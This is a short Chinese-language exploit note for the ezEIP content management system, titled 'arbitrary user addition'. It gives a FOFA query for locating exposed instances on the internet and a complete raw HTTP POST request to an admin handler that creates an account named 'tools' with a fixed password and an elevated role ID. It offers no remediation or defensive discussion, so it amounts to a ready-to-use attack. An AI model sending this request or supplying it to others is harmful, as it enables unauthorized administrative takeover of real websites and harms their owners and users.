# K8-2ezEIP任意用户添加

<u></u>





### 漏洞描述：ezEIP任意用户添加



### Fofa语句：title="ezEIP"



### 漏洞复现：

```
POST /whir_system/Handler/Module/Security/Admin.aspx?time=833 HTTP/1.1

Host: xxx.xxx.xxx.xxx

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 115

Origin: http://www.xxxx.com

Connection: close

Referer: http://www.xxxx.com/whir_system/module/security/Admin_Edit.aspx

Cookie: ASP.NET_SessionId=3c1era4ohgd0s0dr2ytp2kbc; Language=0; isMenu=menu0; lastColumnMenuId=column2-0; bootstrapTableCookie.bs.table.columnid=6; bootstrapTableCookie.bs.table.subjectid=0; ezEIPListPageSize=100; acw_tc=784e2c9a17021904235291788e7e80914ebc2ccf33ab1d47964d7cea608cb8; Whir_ezEIP5_LoginUserCookieKey=Whir_ezEIP5_LoginUserNameCookieKey=JIyHBN+LXuk=&Whir_ezEIP5_LoginUserPwdCookieKey=GeDph7Q+TA5oUO7ISwvvK9+FWVVNd4qHLcWp5RO7Rtq5NAprbDDmz9Pinw4G3N3Z&Whir_ezEIP5_LoginUserLoginFlagCookieKey=; WHIR_EZEIP5_SITEINFOCOOKIEKEY_/=1

 

LoginName=tools&Password=Aa111111&Password2=Aa111111&Email=&RealName=tools&RolesId=2&Remarks=&UserId=0&_action=Save
```

